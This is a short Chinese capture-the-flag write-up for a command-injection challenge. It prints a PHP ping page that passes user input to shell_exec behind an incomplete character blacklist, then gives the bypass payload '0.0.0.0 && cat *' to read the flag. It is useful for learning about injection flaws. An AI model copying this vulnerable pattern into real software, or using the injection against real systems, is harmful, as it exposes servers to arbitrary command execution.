﻿##  Title
Command Execution
##  Tools
firefox或chrome

##  Steps

右键查看源码
```html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>command execution</title>
</head>
<body>
  <!-- exec.php?view_source -->
输入您想要ping的ip地址：
<input id="ip" type="text"/>
<input  type="button" value="ping" onclick="ping()"/>
<div id="res"></div>
  
<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.js"></script>
<script>
function ping(){
$.post("exec.php",{ip:$("#ip").val()},function(result){
$("#res").html(result);
});
}
</script>
</body>
</html> 
```
可以看到有提示 exec.php?view_source  
访问此链接可以看到exec.php的源代码

```php
<?php
if(isset($_GET['view_source']))show_source(__FILE__);
    // Get input

    $target = $_REQUEST[ 'ip' ];
    // var_dump($target);
    $target=trim($target);
    // var_dump($target);
    // Set blacklist
    $substitutions = array(
        ';' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    

    // var_dump($target);

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 1 ' . $target );
    }

    // Feedback for the end user
    echo  "<pre>{$cmd}</pre>";
    

?>
```
这里过滤了一些字符，但是没有过滤& 因此可构造ping的ip地址为：
```shell
0.0.0.0 && cat *
```
即可或得flag.



